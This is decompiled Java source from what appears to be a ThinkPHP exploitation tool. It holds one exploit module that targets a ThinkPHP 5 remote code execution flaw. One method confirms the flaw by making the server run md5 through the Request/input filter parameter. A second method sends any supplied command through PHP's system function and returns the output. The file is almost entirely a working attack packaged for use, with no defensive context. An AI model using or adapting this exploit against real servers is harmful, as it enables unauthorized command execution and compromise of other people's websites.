/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_request_input_rce
/*    */   implements BaseExp {
/* 11 */   private String results = null;
/* 12 */   private final HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 16 */     url = url + "/index.php?s=index/\\think\\Request/input&filter=var_dump&data=md5(2333)";
/* 17 */     Response response = HttpTool.get(url, this.property);
/* 18 */     if (response.getText().contains("f7e0b956540676a129760a3eae309294")) {
/* 19 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 20 */       return this.results;
/*    */     } 
/* 22 */     if (response.getError() != null) {
/* 23 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 24 */       return this.results;
/*    */     } 
/* 26 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 27 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 32 */     url = url + "/index.php?s=index/\\think\\Request/input&filter=system&data=" + cmd;
/* 33 */     Response response = HttpTool.get(url, this.property);
/* 34 */     if (response.getError() == null) {
/* 35 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 37 */       this.results = response.getError();
/*    */     } 
/* 39 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 44 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_request_input_rce.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */